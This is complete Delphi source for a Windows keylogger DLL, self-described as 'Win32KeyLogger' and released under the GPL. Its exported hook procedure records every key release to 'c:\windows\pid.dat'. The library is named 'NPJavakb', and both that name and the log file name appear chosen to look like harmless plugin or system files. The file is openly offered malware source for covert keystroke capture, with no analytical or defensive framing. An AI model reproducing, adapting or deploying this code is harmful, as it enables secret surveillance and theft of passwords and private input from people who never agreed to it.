{   
    Win32KeyLogger, a basic key logger for Windows.
    Copyright (C) 2002 David Cesarino de Sousa

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
}
library NPJavakb;

uses Windows;

procedure hookproced(nCode: Integer; wParam: WPARAM; lParam: LPARAM); stdcall;
var
  LogFile : THandle;
  BytesWritten : DWORD;
  Ch : Byte;
begin
  if ((HiWord(lParam) and KF_UP) <> 0) and (nCode = HC_ACTION) then begin
    LogFile := CreateFile('c:\windows\pid.dat', GENERIC_WRITE,
      FILE_SHARE_READ, Nil, OPEN_ALWAYS, 0, 0);
    SetFilePointer(LogFile, 0, Nil, FILE_END);
    WriteFile (LogFile, wParam, 1, BytesWritten, Nil);
{    if Lo(wParam) = 13 then begin
      Ch := 10;
      WriteFile (LogFile, Ch, 1, BytesWritten, Nil);
    end;}
    CloseHandle(LogFile);
  end;
  CallNextHookEx(0, nCode, wParam, lParam);
end;

exports hookproced;

begin

end.
